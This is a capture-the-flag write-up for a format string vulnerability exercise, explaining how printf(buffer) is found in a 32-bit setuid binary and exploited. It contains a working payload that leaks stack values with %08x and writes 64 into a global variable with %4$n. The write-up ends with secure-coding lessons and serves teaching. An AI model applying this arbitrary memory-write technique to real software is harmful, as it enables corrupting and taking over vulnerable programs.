# Hole-In-Bin - Exercise 07 (Format String Vulnerability)

## Objective

The goal of this challenge is to modify the global variable `target` so that its value becomes **64 (0x40)**.

When this happens, the program prints:

```text
you have modified the target :)
```

Otherwise it prints:

```text
target is %d :(
```

---

# 1. Initial Analysis

The binary is a **32-bit SetUID executable**.

```bash
file bin
```

Output:

```text
bin: setuid ELF 32-bit LSB executable
```

The binary is dynamically linked and not stripped, which makes reverse engineering much easier because function names and symbols are still present.

---

# 2. Looking for Interesting Strings

Using:

```bash
strings bin
```

shows:

```text
you have modified the target :)
target is %d :(
printf
fgets
```

This immediately suggests that the program compares something before deciding which message to print.

---

# 3. Finding the Target Variable

The symbol table reveals a global variable named `target`.

```bash
objdump -t bin | grep target
```

Output:

```text
080496e4 g     O .bss 00000004 target
```

Therefore

```
target = 0x080496e4
```

It is stored inside the `.bss` section.

---

# 4. Reverse Engineering

Disassembling the vulnerable function:

```bash
objdump -M intel -d bin
```

shows:

```asm
call fgets

lea eax,[ebp-0x208]
mov [esp],eax
call printf
```

This corresponds to the C code:

```c
char buffer[512];

fgets(buffer,512,stdin);

printf(buffer);
```

This is the vulnerability.

---

# 5. Why is printf(buffer) Dangerous?

Normally, printing user input should be done like this:

```c
printf("%s", buffer);
```

because `%s` tells printf to treat the input as ordinary text.

Instead, the program executes

```c
printf(buffer);
```

Now **our input becomes the format string itself**.

This allows us to inject format specifiers such as:

```
%x
%s
%n
```

which causes `printf` to read or write memory.

This is called a **Format String Vulnerability**.

---

# 6. Confirming the Vulnerability

To confirm that the input is interpreted as a format string:

```bash
python -c "print('AAAA ' + ' %08x'*30)" | ./bin
```

Output:

```text
AAAA 00000200 b7754c20 b7770328 41414141 ...
```

Notice:

```
41414141
```

which is hexadecimal for

```
AAAA
```

This tells us that our input eventually appears as arguments consumed by `printf`.

This is exactly what is needed for a format string exploit.

---

# 7. Locating Our Argument

The output begins with:

```
00000200
b7754c20
b7770328
41414141
```

Counting the arguments:

```
1 -> 00000200
2 -> b7754c20
3 -> b7770328
4 -> 41414141
```

Therefore:

```
Our controlled data is the 4th printf argument.
```

This is why the exploit later uses

```
%4$n
```

---

# 8. Understanding %n

Among printf's format specifiers, `%n` is unique.

Instead of printing something, it performs a write.

Specifically:

```
%n
```

takes an integer pointer and writes the number of characters printed so far into that address.

Example:

```c
int x;

printf("Hello%n",&x);
```

prints

```
Hello
```

and afterwards

```
x = 5
```

because five characters were printed.

This behavior is extremely dangerous when attackers control both:

* the format string
* the pointer used by `%n`

---

# 9. Preparing the Exploit

We already know

```
target = 0x080496e4
```

On x86, memory addresses are little-endian.

Therefore the address must be written as

```
0x080496e4

↓

\xe4\x96\x04\x08
```

These four bytes are placed at the beginning of the input so they become the fourth argument consumed by `printf`.

---

# 10. Why 60 A's?

The payload is

```python
'\xe4\x96\x04\x08'
+
'A'*60
+
'%4$n'
```

Let's count the printed characters.

Address bytes:

```
4 bytes
```

Padding:

```
60 bytes
```

Total characters printed before `%n`:

```
4 + 60 = 64
```

Exactly

```
0x40
```

---

# 11. The Final Payload

```bash
python -c "print('\xe4\x96\x04\x08' + 'A'*60 + '%4\$n')" | ./bin
```

What happens:

### Step 1

The first four bytes become

```
0x080496e4
```

which is the address of `target`.

---

### Step 2

`printf` prints

```
address bytes
+
60 As
```

A total of

```
64 characters
```

have now been printed.

---

### Step 3

`%4$n`

tells `printf`:

> "Take the 4th argument as a pointer and store the number of characters printed so far."

The fourth argument is

```
0x080496e4
```

Therefore

```
*(0x080496e4) = 64
```

which is equivalent to

```c
target = 64;
```

---

# 12. Program Flow

The binary then executes:

```asm
mov eax,[target]

cmp eax,0x40
```

Since

```
target == 64
```

the comparison succeeds.

Execution jumps to

```asm
puts("you have modified the target :)")
```

instead of

```asm
printf("target is %d :(", target)
```

---

# 13. Why This Exploit Works

The exploit relies on three conditions:

1. The program passes user input directly to `printf`.

```
printf(buffer);
```

2. The target variable has a fixed address.

```
target = 0x080496e4
```

3. `%n` writes the number of printed characters to an arbitrary address supplied as one of `printf`'s arguments.

By carefully controlling:

* where `%n` writes (`0x080496e4`)
* how many characters are printed beforehand (64)

we force

```
target = 64
```

without overflowing the buffer or injecting shellcode.

---

# Key Takeaways

* Never call `printf(user_input)`.
* Always use:

```c
printf("%s", user_input);
```

* Format string vulnerabilities allow attackers to:

  * Leak stack memory with `%x`.
  * Read arbitrary memory with `%s`.
  * Write arbitrary memory with `%n`.
* `%n` is one of the most dangerous format specifiers because it transforms a read-only bug into an arbitrary memory write.
* This challenge demonstrates how a format string vulnerability can modify program state without any buffer overflow.
